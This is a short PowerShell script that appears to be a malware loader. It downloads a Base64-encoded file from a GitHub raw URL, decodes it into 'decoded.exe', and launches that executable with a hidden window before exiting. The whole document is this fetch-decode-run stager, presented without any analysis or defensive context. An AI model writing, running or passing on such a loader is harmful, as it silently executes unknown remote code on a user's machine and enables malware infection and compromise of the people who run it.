# Define URL and output file names
$exeUrl = "https://raw.githubusercontent.com/lookatmelaw/first/refs/heads/main/encoded_executable.txt"
$exeFilePath = "decoded.exe"

# Fetch the Base64-encoded content from the URL
$base64Content = (Invoke-WebRequest -Uri $exeUrl -UseBasicParsing).Content

# Decode the Base64 content and save it as an executable file
[System.IO.File]::WriteAllBytes($exeFilePath, [Convert]::FromBase64String($base64Content))

# Run the decoded .exe file in the background
Start-Process -FilePath $exeFilePath -WindowStyle Hidden

# Exit the PowerShell script
Exit
